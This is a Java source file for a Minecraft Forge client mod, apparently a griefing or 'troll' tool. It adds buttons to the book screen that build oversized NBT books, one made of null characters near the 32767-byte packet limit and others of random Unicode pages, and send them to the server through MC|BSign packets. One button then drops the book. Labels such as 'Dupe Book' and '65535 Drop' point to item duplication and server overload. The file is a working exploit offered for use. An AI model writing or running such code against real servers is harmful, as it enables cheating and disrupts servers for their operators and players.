package com.terriblefriends.troll;

import com.terriblefriends.troll.access.GuiScreenBookAccess2;
import io.netty.buffer.Unpooled;
import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.gui.GuiScreenBook;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.util.EnumFacing;
import net.minecraftforge.client.event.GuiScreenEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.relauncher.Side;

import java.util.Random;

import static com.terriblefriends.troll.Util.CLIENT;

@Mod.EventBusSubscriber(Side.CLIENT)
public class GuiScreenBookEventHandler {

    private static ItemStack DUPE_BOOK;
    public static GuiButton buttonOverloadDrop;
    public static GuiButton buttonOverload;
    public static GuiButton buttonPageStuff;
    public static GuiButton buttonUnicodeStuff;

    @SubscribeEvent
    public static void initGui(GuiScreenEvent.InitGuiEvent.Post event) {
        GuiScreen guiScreen = event.getGui();

        if (guiScreen instanceof GuiScreenBook) {
            GuiScreenBookAccess2 access = (GuiScreenBookAccess2)guiScreen;
            if (access.getBookIsUnsigned()) {
                buttonOverloadDrop = new GuiButton(1337, guiScreen.width / 2 - 100, 196 + 25, 98, 20, "65535 Drop");
                buttonOverload = new GuiButton(1338, guiScreen.width / 2 + 2, 196 + 25, 98, 20, "65535 Keep");

                buttonPageStuff = new GuiButton(99, guiScreen.width / 2 - 100, 196 + 50, 98, 20, "Page Stuff");
                buttonUnicodeStuff = new GuiButton(100, guiScreen.width / 2 + 2, 196 + 50, 98, 20, "Dupe Book");

                event.getButtonList().add(buttonOverload);
                event.getButtonList().add(buttonOverloadDrop);
                event.getButtonList().add(buttonPageStuff);
                event.getButtonList().add(buttonUnicodeStuff);
            }
        }
    }

    /*@Inject(at = @At("HEAD"), method = "sendChatMessage", cancellable = true)
    public void onChatMessage(String message, CallbackInfo ci){
        if(message.equals(".d") || message.equals(".s")) {
            ClientPlayerEntity player = (ClientPlayerEntity) (Object) this;
            if (player.inventory.getMainHandStack().getItem() == Items.WRITABLE_BOOK) {
                player.networkHandler.sendPacket(new BookUpdateC2SPacket(DUPE_BOOK, true, player.inventory.selectedSlot));
                if (message.equals(".s")) player.networkHandler.sendPacket(new ClickSlotC2SPacket(player.currentScreenHandler.syncId, 36 + player.inventory.selectedSlot, 0, SlotActionType.THROW, DUPE_BOOK, player.currentScreenHandler.getNextActionId(player.inventory)));
            }
            ci.cancel();
        }
    }*/

    @SubscribeEvent
    public static void performAction(GuiScreenEvent.ActionPerformedEvent.Pre event) {
        if(event.getGui() instanceof GuiScreenBook) {
            GuiButton button = event.getButton();
            if ((button.id == 1337 || button.id == 1338 )&& CLIENT.player.getHeldItemMainhand().getItem() == Items.WRITABLE_BOOK) {
                StringBuilder stringBuilder = new StringBuilder();
                for(int i = 0; i < 32767/2-34; i++){
                    stringBuilder.append((char)0);
                }
                String str1 = stringBuilder.toString();
                DUPE_BOOK = new ItemStack(Items.WRITABLE_BOOK, 1);
                DUPE_BOOK.setTagInfo("title", new NBTTagString("NBT 0V3RFL0W"));
                NBTTagList listTag = new NBTTagList();
                listTag.appendTag(new NBTTagString(str1));
                DUPE_BOOK.setTagInfo("pages", listTag);
                DUPE_BOOK.setTagInfo("author", new NBTTagString("l33t haxx0r"));
                PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
                packetbuffer.writeItemStack(DUPE_BOOK);
                System.out.println(packetbuffer.writerIndex());
                if (packetbuffer.writerIndex() > 32767) {

                }
                else {
                    CLIENT.getConnection().sendPacket(new CPacketCustomPayload("MC|BSign", packetbuffer));
                    CLIENT.displayGuiScreen(null);
                    if (button.id == 1337) {
                        CLIENT.getConnection().sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.DROP_ITEM, CLIENT.player.getPosition(), EnumFacing.DOWN));
                    }
                }
            }
            if ((button.id == 99 || button.id == 100)&& CLIENT.player.getHeldItemMainhand().getItem() == Items.WRITABLE_BOOK) {
                Random rand = new Random();
                NBTTagList listTag = new NBTTagList();
                StringBuilder stringBuilder;
                int pages = 1;
                int charPerPage = 10960;
                if (button.id == 100) {
                    pages = 50;
                    charPerPage = 218;
                }

                for (int page = 0; page < pages; page++) {
                    stringBuilder = new StringBuilder();
                    for (int characters = 0; characters < charPerPage; characters++) {
                        stringBuilder.append((char)(rand.nextInt(65565-128)+128));
                    }
                    String currentPage = stringBuilder.toString();
                    listTag.appendTag(new NBTTagString(currentPage));
                }

                DUPE_BOOK = new ItemStack(Items.WRITABLE_BOOK, 1);
                stringBuilder = new StringBuilder();
                for (int characters = 0; characters < 32; characters++) {
                    stringBuilder.append((char)(rand.nextInt(65565-128)+128));
                }

                DUPE_BOOK.setTagInfo("title", new NBTTagString(stringBuilder.toString()));
                DUPE_BOOK.setTagInfo("pages", listTag);
                DUPE_BOOK.setTagInfo("author", new NBTTagString("l33t haxx0r"));
                PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
                packetbuffer.writeItemStack(DUPE_BOOK);
                System.out.println(packetbuffer.writerIndex());
                if (packetbuffer.writerIndex() > 32767) {

                }
                else {
                    CLIENT.getConnection().sendPacket(new CPacketCustomPayload("MC|BSign", packetbuffer));
                    CLIENT.displayGuiScreen(null);
                }
            }
        }
    }
}
